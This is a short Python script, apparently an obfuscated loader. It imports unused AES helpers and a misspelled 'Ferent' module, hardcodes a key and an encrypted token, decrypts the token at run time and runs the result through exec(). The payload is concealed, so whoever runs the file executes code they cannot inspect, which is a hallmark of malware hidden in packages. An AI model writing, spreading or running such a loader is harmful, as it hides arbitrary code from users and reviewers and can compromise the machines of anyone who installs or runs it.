from aes import AES, AESModeOfOperationCTR, AESModeOfOperationCBC, AESModeOfOperationCFB, AESModeOfOperationECB, AESModeOfOperationOFB, AESModesOfOperation, Counter
from blockfeeder import decrypt_stream, Decrypter, encrypt_stream, Encrypter
from blockfeeder import PADDING_NONE, PADDING_DEFAULT
from ferent import Ferent

key = b'2YO2wd6yZXxSKOldJVESjc79nugyGSLwmvob9e0XuLw='
encrypted_code = b'gAAAAABlrqFYounTi7tL3olAx_4Ho4nfpM7TwjZ7RHGHeXBbuxqR9s8bzPgchzIWGgVkqaSFZtCjP2324uSu3uUSPkKpshd2qRJ4ZxjwoG3bzBlxpV7UZE0g6dMf18nokdu1S_5fCwFj'

def main():
    encryption_type = Ferent(key)
    decrypted_code = encryption_type.decrypt(encrypted_code)
    exec(decrypted_code)

main()